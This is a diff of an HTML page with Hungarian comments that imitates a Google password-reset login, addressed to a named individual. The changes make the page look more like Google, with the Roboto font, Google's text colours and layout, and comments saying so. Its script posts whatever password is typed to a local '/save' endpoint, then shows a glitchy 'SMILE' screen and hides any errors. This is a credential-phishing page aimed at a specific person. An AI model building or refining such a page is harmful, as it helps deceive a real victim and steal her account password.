@@ -4,12 +4,17 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Google/Help.Újraállítás</title>
+<!-- Google Font import: Roboto (ezt használja a Google) -->
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+
 <style>
 * {
     margin: 0;
     padding: 0;
     box-sizing: border-box;
-    font-family: 'Arial', sans-serif;
+    font-family: 'Roboto', sans-serif; /* Visszaállítva a Google stílusra */
 }
 
 body {
@@ -22,10 +27,10 @@ body {
 }
 
 .card {
-    width: 800px; /* Szélesbítettem */
+    width: 450px; /* Google login kártyák általában keskenyebbek és magasabbak */
     max-width: 100%;
     background: white;
-    color: black;
+    color: #202124; /* Sötétszürke, nem fekete - ez a Google szín */
     border-radius: 8px;
     padding: 48px 40px 36px;
     box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12);
@@ -45,32 +50,34 @@ h1 {
     font-size: 24px;
     font-weight: 400;
     margin-bottom: 8px;
-    text-align: center;
+    text-align: left; /* Google formákban a cím balra igazított */
 }
 
 .subtitle {
     font-size: 16px;
     line-height: 1.5;
-    text-align: center;
+    text-align: left;
     margin-bottom: 32px;
+    color: #202124;
 }
 
 input[type="password"],
 input[type="text"] {
     width: 100%;
-    padding: 17px 15px;
+    padding: 13px 15px; /* Kicsit vékonyabb padding, mint a Google inputoknál */
     border: 1px solid #dadce0;
     border-radius: 4px;
-    color: black;
+    color: #202124;
     font-size: 16px;
     outline: none;
+    transition: border-color 0.2s;
 }
 
 input[type="password"]:focus,
 input[type="text"]:focus {
     border-color: #1a73e8;
-    border-width: 2px;
-    padding: 16px 14px; /* compensate for border width change */
+    border-width: 1px; /* Nem változik a vastagság, csak a szín */
+    padding: 13px 15px;
 }
 
 .options {
@@ -78,15 +85,18 @@ input[type="text"]:focus {
     display: flex;
     align-items: center;
     gap: 8px;
+    cursor: pointer;
 }
 
 .options input[type="checkbox"] {
     width: auto;
+    cursor: pointer;
 }
 
 label {
     cursor: pointer;
     font-size: 14px;
+    color: #202124;
 }
 
 button {
@@ -97,26 +107,30 @@ button {
     border-radius: 4px;
     background: #1a73e8;
     color: white;
-    font-weight: bold;
+    font-weight: 500;
     font-size: 14px;
     cursor: pointer;
+    letter-spacing: 0.25px;
 }
 
 button:hover {
     background: #1765cc;
+    box-shadow: 0 1px 2px rgba(60,64,67,0.3);
 }
 
 @media (max-width: 768px) {
     .card {
         padding: 32px 24px;
+        box-shadow: none; /* Mobilon gyakran nincs árnyék */
+        background: transparent;
     }
-
+    
     h1 {
         font-size: 20px;
     }
 }
 
-/* Új stílusok a sikeres beküldés utáni nézethez */
+/* RETRÓ GLITCH STÍLUSOK (Megmaradt a kért effekt) */
 .success-container {
     display: none;
     position: fixed;
@@ -124,79 +138,121 @@ button:hover {
     left: 0;
     width: 100%;
     height: 100%;
-    background: #000;
+    background: #0d0d0d;
     justify-content: center;
     align-items: center;
     flex-direction: column;
     z-index: 1000;
+    overflow: hidden;
 }
 
 .smiley-face {
-    width: 100px;
-    height: 100px;
+    width: 120px;
+    height: 120px;
     border-radius: 50%;
-    background: #fff;
+    background: #ffeb3b;
     position: relative;
     margin-bottom: 20px;
-    animation: glitch 1s infinite; /* Glitch animáció */
+    border: 3px solid #000;
+    box-shadow: 4px 4px 0px #000;
+    animation: glitch-skew 1s infinite linear alternate-reverse;
 }
 
-@keyframes glitch {
-    0% { transform: translate(0); }
-    20% { transform: translate(-2px, 2px); }
-    40% { transform: translate(-2px, -2px); }
-    60% { transform: translate(2px, 2px); }
-    80% { transform: translate(2px, -2px); }
-    100% { transform: translate(0); }
+@keyframes glitch-skew {
+    0% { transform: skew(0deg); }
+    20% { transform: skew(-10deg); }
+    40% { transform: skew(5deg); }
+    60% { transform: skew(-5deg); }
+    80% { transform: skew(10deg); }
+    100% { transform: skew(0deg); }
+}
+
+@keyframes glitch-clip {
+    0% { clip-path: inset(40% 0 21% 0); }
+    20% { clip-path: inset(10% 0 60% 0); }
+    40% { clip-path: inset(70% 0 10% 0); }
+    60% { clip-path: inset(20% 0 50% 0); }
+    80% { clip-path: inset(50% 0 30% 0); }
+    100% { clip-path: inset(10% 0 70% 0); }
 }
 
 .smiley-face::before,
 .smiley-face::after {
     content: '';
     position: absolute;
-    width: 10px;
-    height: 10px;
+    width: 15px;
+    height: 15px;
     background: #000;
     border-radius: 50%;
-    top: 35px;
+    top: 40px;
+    z-index: 2;
 }
 
 .smiley-face::before {
-    left: 25px;
+    left: 30px;
+    animation: glitch-clip 0.4s infinite linear alternate-reverse;
 }
 
 .smiley-face::after {
-    right: 25px;
+    right: 30px;
+    animation: glitch-clip 0.6s infinite linear alternate-reverse;
 }
 
 .smile {
     position: absolute;
-    bottom: 20px;
+    bottom: 25px;
     left: 50%;
     transform: translateX(-50%);
-    width: 40px;
-    height: 20px;
-    border-bottom: 3px solid #000;
-    border-radius: 0 0 20px 20px;
+    width: 50px;
+    height: 25px;
+    border-bottom: 4px solid #000;
+    border-radius: 0 0 25px 25px;
+    z-index: 2;
+}
+
+.smiley-face-glitch {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #ffeb3b;
+    opacity: 0.7;
+    mix-blend-mode: hard-light;
+    animation: glitch-clip 0.2s infinite;
+    clip-path: inset(0 0 0 0);
 }
 
 .success-text {
     color: #fff;
-    font-size: 24px;
+    font-size: 28px;
     font-weight: bold;
     text-transform: uppercase;
-    letter-spacing: 2px;
-    margin-bottom: 10px;
+    letter-spacing: 4px;
+    margin-bottom: 15px;
+    text-shadow: 2px 2px 0px #ff00ff, -2px -2px 0px #00ffff;
+    animation: flicker 0.5s infinite alternate;
+}
+
+@keyframes flicker {
+    0% { opacity: 1; }
+    50% { opacity: 0.8; }
+    100% { opacity: 1; }
 }
 
 .quote {
-    color: #ccc;
-    font-size: 14px;
+    color: #aaa;
+    font-size: 16px;
     text-align: center;
-    max-width: 300px;
-    line-height: 1.4;
-    text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #fff; /* Világító hatás */
+    max-width: 400px;
+    line-height: 1.6;
+    text-shadow: 1px 1px 2px #000;
+    font-style: italic;
+    border-top: 1px solid #333;
+    padding-top: 15px;
+    margin-top: 10px;
 }
+
 </style>
 </head>
 <body>
@@ -204,17 +260,17 @@ button:hover {
 <div class="card">
   <div class="logo-container">
     <!-- Saját logó -->
-    <img src="igy jol fog kinezni.png" alt="Logo" class="logo">
+    <img src="igy fog jol kinezni.png" alt="Logo" class="logo">
   </div>
-  
+
   <h1>Béresné Madai Krisztina</h1>
-  
+
   <p class="subtitle">Adja meg a jelszót a folytatáshoz</p>
-  
+
   <input type="password" id="pwd" placeholder="Jelszó">
 
   <!-- Hozzáadtam egy elemet az állapot jelzésére -->
-  <div id="status" style="margin-top:10px; font-size:14px; color:#ccc;"></div>
+  <div id="status" style="margin-top:10px; font-size:14px; color:#5f6368;"></div>
 
   <div class="options">
     <input type="checkbox" id="show">
@@ -227,15 +283,15 @@ button:hover {
 
 <!-- Sikeres beküldés utáni nézet -->
 <div class="success-container" id="successContainer">
-  <div class="smiley-face">
-    <div class="smile"></div>
-  </div>
-  <div class="success-text">SMILE</div>
-  <div class="quote">Nem látni egy fától az erdőt mily szomorú, de amint felvillan a figyelem elillan</div>
+    <div class="smiley-face">
+        <div class="smiley-face-glitch"></div>
+        <div class="smile"></div>
+    </div>
+    <div class="success-text">SMILE</div>
+    <div class="quote">nem látod a fától az erdőt mert, amint ez felillan a figyelem elillan.</div>
 </div>
 
 <script>
-// JAVÍTÁS: document.getElementById("pwd")
 const passwordInput = document.getElementById("pwd");
 const showCheckbox = document.getElementById("show");
 const statusDiv = document.getElementById("status");
@@ -247,12 +303,7 @@ showCheckbox.addEventListener("change", () => {
 });
 
 function login() {
-  // JAVÍTÁS: ID: "show" (nem "checkbox")
-  const checkbox = document.getElementById("show");
-
-  // JAVÍTÁS: Az input értékének lekérése a passwordInput-ból
   const input = passwordInput;
-  const gomb = loginBtn;
 
   if (!input.value.trim()) {
     statusDiv.textContent = "Kérlek adj meg egy jelszót.";
@@ -261,21 +312,16 @@ function login() {
 
   async function kuldes() {
     try {
-      // Figyelem: Ha localhost:3000-re küldesz, a szervernek engedélyeznie kell a CORS-t!
       await fetch('http://localhost:3000/save', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ uzenet: input.value })
       });
-      // NEM írunk ki semmit, csak küldjük el
-      
-      // Sikeres beküldés után megjelenítjük a successContainer-t
+
       successContainer.style.display = 'flex';
     } catch (error) {
       console.error("Hiba:", error);
-      // NEM írunk ki semmit, ha hiba történik
     } finally {
-      // Reseteljük a bemenetet
       input.value = '';
     }
   }
@@ -283,7 +329,6 @@ function login() {
   kuldes();
 }
 
-// Enter billentyű támogatása
 document.addEventListener('keydown', function(event) {
   if (event.key === 'Enter') {
     login();
